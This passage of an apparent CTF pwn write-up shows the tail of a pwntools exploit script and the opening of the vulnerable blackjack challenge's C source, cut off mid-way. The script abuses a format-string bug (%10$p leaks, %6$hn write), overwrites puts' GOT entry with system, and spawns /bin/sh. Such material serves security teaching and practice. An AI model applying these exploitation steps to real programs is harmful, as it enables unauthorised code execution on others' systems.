class="string">"%dp4nda%10$pp4nda%16$pp4nda\0"</span>,<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'c'</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'motto:'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line"><span class="keyword">if</span>(((heap+<span class="number">48</span>)&gt;&gt;(<span class="number">8</span>*i))&amp;<span class="number">0xff</span>) ==<span class="number">0x0a</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"bad addr"</span></span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\0'</span>+<span class="string">'a'</span>*(<span class="number">0xf0</span><span class="number">-0x10</span><span class="number">-8</span>)+p64(heap+<span class="number">48</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name'</span>)</span><br><span class="line">p.sendline(<span class="string">'%6$hn'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"3p4nda"</span>+hex(elf.got[<span class="string">'puts'</span>])+<span class="string">"p4nda"</span>+hex(libc.symbols[<span class="string">'system'</span>])+<span class="string">'p4nda'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'motto'</span>)</span><br><span class="line">p.sendline(<span class="string">'p4nda'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;                //Used for srand((unsigned) time(NULL)) command</span></span></span><br><span class="line"><span class="comment">//#include &lt;process.h&gt;             //Used for system("cls") command</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> spade 35                 <span class="comment">//Used to print spade symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> club 36                 <span class="comment">//Used to print club symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> diamond 37               <span class="comment">//Used to print diamond symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> heart 38                 <span class="comment">//Used to print heart symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RESULTS <span class="meta-string">"Blackjack.txt"</span>  <span class="comment">//File name is Blackjack</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIN_SUM 65535 </span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNS_Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> user[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">char</span> domain[<span class="number">0x30</span>];</span><br><span class="line"><span class="keyword">char</span> *ptr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Global Variables</span></span><br><span class="line"><span class="keyword">int</span> k;</span><br><span class="line"><span class="keyword">int</span> l;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line"><span class="keyword">int</span> won;</span><br><span class="line"><span class="keyword">int</span> loss;</span><br><span class="line"><span class="keyword">int</span> cash = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> bet;</span><br><span class="line"><span class="keyword">int</span> random_card;</span><br><span class="line"><span class="keyword">int</span> player_total=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> dealer_total=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> * visitor_name ;</span><br><span class="line"><span class="keyword">int</span> login_flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> * motto=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNS_Node</span> *<span class="title">DNS_Node_List</span>[0<span class="title">x20</span>];</span></span><br><span class="line"><span class="comment">//Function Prototypes</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">clubcard</span><span class="params">()</span></span>;      <span class="comment">//Displays Club Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">diamondcard</span><span class="params">()</span></span>;   <span class="comment">//Displays Diamond Card Image</span></span><br><span class="line"><span class="function"><span 